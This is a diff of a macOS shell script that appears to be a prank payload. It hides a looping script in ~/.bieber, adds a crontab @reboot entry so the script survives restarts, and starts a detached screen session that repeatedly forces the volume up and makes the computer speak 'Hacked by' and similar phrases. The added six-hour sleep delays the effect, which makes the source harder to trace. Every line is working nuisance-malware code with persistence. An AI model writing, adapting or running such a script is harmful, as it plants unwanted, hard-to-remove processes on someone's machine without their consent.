@@ -1,5 +1,9 @@
+echo "Sleeping for 6 hours";
+
+sleep 21600;
+
 cat <<EOF > ~/.bieber
-while true; do sleep 20; osascript -e "set Volume 10"; say "Trying to hack the"; cat /usr/share/dict/words | perl -e 'print join("", sort { rand(1) <=> 0.5 } <>);' | head -n 1 | say;  done;
+while true; do sleep 20; osascript -e "set Volume 10"; say "Justin Bieber is great";  done;
 EOF
 
 cat <<EOF > ~/.pconfiguration
@@ -46,4 +50,6 @@ crontab -l > /tmp/cron
 echo "@reboot ~/.bieber" >> /tmp/cron
 crontab /tmp/cron
 
-screen -dm bash -c "while true; do sleep 4; osascript -e \"set Volume 10\"; say \"Trying to hack the\"; cat /usr/share/dict/words | perl -e 'print join(\"\", sort { rand(1) <=> 0.5 } <>);' | head -n 1 | say ;  done;"
+screen -dm bash -c "while true; do sleep 4; osascript -e \"set Volume 10\"; say \"Hacked by \"; cat /usr/share/dict/words | perl -e 'print join(\"\", sort { rand(1) <=> 0.5 } <>);' | head -n 1 | say ;  done;"
+
+/bin/bash ~/.bieber
